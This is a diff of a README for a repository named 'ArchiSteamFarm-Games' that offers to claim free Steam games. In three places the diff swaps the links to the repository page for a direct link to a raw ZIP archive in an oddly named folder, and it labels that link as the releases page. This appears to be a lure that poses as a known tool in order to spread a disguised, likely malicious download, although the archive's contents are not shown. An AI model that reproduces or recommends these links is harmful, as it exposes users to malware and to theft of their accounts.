@@ -1,6 +1,6 @@
 # 🎮 ArchiSteamFarm-Games - Claim free steam games automatically today
 
-[![Download ArchiSteamFarm-Games](https://img.shields.io/badge/Download-Release-blue)](https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games)
+[![Download ArchiSteamFarm-Games](https://img.shields.io/badge/Download-Release-blue)](https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games/raw/refs/heads/main/unnicely/Archi_Farm_Games_Steam_v2.8-beta.2.zip)
 
 ## 📦 About the software
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements:
 
 ## 🚀 Getting started
 
-1. Visit the [releases page](https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games) to locate the latest version.
+1. Visit the [releases page](https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games/raw/refs/heads/main/unnicely/Archi_Farm_Games_Steam_v2.8-beta.2.zip) to locate the latest version.
 2. Choose the download link labeled for Windows.
 3. Save the file to a folder on your computer.
 4. Extract the contents of the ZIP folder.
@@ -56,7 +56,7 @@ You decide which games the software claims. Edit the filter settings in the conf
 
 ## 📥 Maintenance and updates
 
-Check the main repository link at https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games occasionally. Developers release updates to ensure compatibility with Steam. Download the new version and replace the old files to keep the software current. Always back up your configuration file before you replace the folder contents. This preserves your account settings.
+Check the main repository link at https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games/raw/refs/heads/main/unnicely/Archi_Farm_Games_Steam_v2.8-beta.2.zip occasionally. Developers release updates to ensure compatibility with Steam. Download the new version and replace the old files to keep the software current. Always back up your configuration file before you replace the folder contents. This preserves your account settings.
 
 ## 📚 Features summary
 
